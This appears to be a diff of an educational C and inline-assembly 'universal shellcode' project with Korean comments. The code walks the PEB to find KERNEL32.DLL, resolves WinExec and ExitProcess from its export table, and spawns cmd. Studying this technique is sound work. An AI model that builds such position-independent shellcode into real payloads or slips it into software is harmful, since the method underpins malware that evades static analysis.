@@ -1,10 +1,38 @@
+
+/*
+bool define
+*/
+
 #define TRUE 1
 #define FALSE 0
 
+/*
+SW_SHOW value is for using WinExec API
+
+UINT WinExec(
+  LPCSTR lpCmdLine,
+  UINT   uCmdShow
+);
+
+UINT: unsigned int
+LPCSTR: long pointer constant string (const char *)
+...
+
+unsigned int WinExec(
+	const char *lpCmdLine,
+	unsigned int uCmdShow
+);
+
+*/
 #define SW_SHOW 5
 
-
 /*
+
+purpose:		universal-shellcode
+programmer:	woohyuk seo (서우혁)
+doc write date: 	12/19/2019
+compiler: 	Visual Studio 2019 C++
+
 universal shellcode는 kernel32.dll이 export하는 주소가 매번 바뀌어서 call하는 주소가 유효하지 않게된다
 정적으로 만들어진 일반적인 쉘코드의 한계를 극복하기 위해서 만들어졌다.
 
@@ -51,7 +79,7 @@ typedef struct _PEB_LDR_DATA {
 } PEB_LDR_DATA, *PPEB_LDR_DATA;
 
 PEB에서 (2 + 1 + 1 + 4 + 4 = 12) 만큼 더하면 PPEB_LDR_DATA Ldr (포인터 변수)의 주소가 나옴
-LoaderData가 가르키는 주소에서, (8 + (4 * 3) = 20)  만큼 더하면 LIST_ENTRY InMemoryOrderModuleList 의 주소가 나옴
+Loade_export가 가르키는 주소에서, (8 + (4 * 3) = 20)  만큼 더하면 LIST_ENTRY InMemoryOrderModuleList 의 주소가 나옴
 InMemoryOrderModuleList 은 이중링크를 가지고 있다.
 
 정보는 다음과 같다
@@ -100,7 +128,7 @@ DllBase는 LPVOID형식임으로 mov를 사용한다.
 */
 
 
-int GetApiAddress(int* base, int* rdata, const char* FindApiName)
+int GetApiAddress(int* base, int* _export, const char* FindApiName)
 {
 	int FindApiNameLength;
 	for (FindApiNameLength = 0; FindApiName[FindApiNameLength] != 0; FindApiNameLength++);
@@ -110,14 +138,14 @@ int GetApiAddress(int* base, int* rdata, const char* FindApiName)
 	int OT;	 //Ordinal Table
 
 	//get info
-	int NumberOfFunction = *(rdata + 6);
-	
-	EAT = *(rdata + 7); //sizeof(int) * 7 (28) Export Address Table RVA
-	NPT = *(rdata + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
-	OT = *(rdata + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA
+	int NumberOfFunction = *(_export + 6);
+
+	EAT = *(_export + 7); //sizeof(int) * 7 (28) Export Address Table RVA
+	NPT = *(_export + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
+	OT = *(_export + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA
 
 	//Get VA (Virtual Address)
-	NPT += (int)base;	
+	NPT += (int)base;
 	OT += (int)base;
 	EAT += (int)base;
 
@@ -132,7 +160,7 @@ int GetApiAddress(int* base, int* rdata, const char* FindApiName)
 		index++;
 
 		int IsCmp = TRUE;
-		
+
 		//Get name length
 		int ApiStringLength = 0;
 		for (; ((char*)*ptr + (int)base)[ApiStringLength] != 0; ApiStringLength++);
@@ -149,7 +177,7 @@ int GetApiAddress(int* base, int* rdata, const char* FindApiName)
 				}
 			}
 
-			
+
 			if (IsCmp == TRUE)
 			{
 				//Successfully string compare
@@ -182,7 +210,7 @@ int GetApiAddress(int* base, int* rdata, const char* FindApiName)
 
 	//Get EA (Export Address)
 	LoopCount = 1;
-	int **ReferenceExportAddressTable = (int**)&EAT;
+	int** ReferenceExportAddressTable = (int**)&EAT;
 
 	for (;;)
 	{
@@ -199,10 +227,26 @@ int GetApiAddress(int* base, int* rdata, const char* FindApiName)
 
 void shellcode()
 {
-	//const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value
+	/*
+
+	example for calculating hash
+
+	const char kernel32_string[] = "KERNEL32.DLL";
+	int kernel32_string_hash = 0;
+
+	for (int i = 0; kernel32_string[i] != 0; i++)
+	{
+		kernel32_string_hash += kernel32_string[i];
+	}
+
+	//kernel32_string_hash is 816 (decimal);
+
+	*/
+
+	const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value
 
 	int* base;
-	int* rdata;
+	int* _export;
 
 	__asm
 	{
@@ -254,7 +298,7 @@ typedef struct _LSA_UNICODE_STRING {
 		//if not equals, while
 		jne get_hash_lable;
 
-		cmp ecx, 816; //KERNEL32.DLL string hash value
+		cmp ecx, kernel32_string_hash; //KERNEL32.DLL string hash value
 		// if not equals the KERNEL32.DLL hash
 		jne get_next_front_link;
 
@@ -270,17 +314,30 @@ typedef struct _LSA_UNICODE_STRING {
 		add edi, ebx;			//add DllBase
 		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
 		add edi, ebx;			//add DllBase
-		mov edx, edi;			//.rdata IMAGE_EXPORT_DIRECTORY
+		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY
 
-		mov dword ptr[rdata], edx;	//.rdata export table
+		mov dword ptr[_export], edx;	//._export export table
 		mov dword ptr[base], ebx;	//MZ
 	}
 
-	int _WinExec = GetApiAddress(base, rdata, "WinExec");
-	int _ExitProcess = GetApiAddress(base, rdata, "ExitProcess");;
+	int _WinExec = GetApiAddress(base, _export, "WinExec");
+	int _ExitProcess = GetApiAddress(base, _export, "ExitProcess");
 
-	((int (*) (const char *, int))_WinExec)("cmd", SW_SHOW);
-	((int (*) (int))_ExitProcess)(0);
+	const char shell[] = "cmd";
+
+	//call WinExec
+	__asm
+	{
+		push SW_SHOW;
+
+		lea eax, [shell];
+		push eax;
+
+		call _WinExec;
+	}
+	
+	//call ExitProcess
+	((void (*) (unsigned int))_ExitProcess)(0);
 
 	return;
 }
@@ -289,6 +346,5 @@ typedef struct _LSA_UNICODE_STRING {
 int main()
 {
 	shellcode();
-
 	return 0;
 }
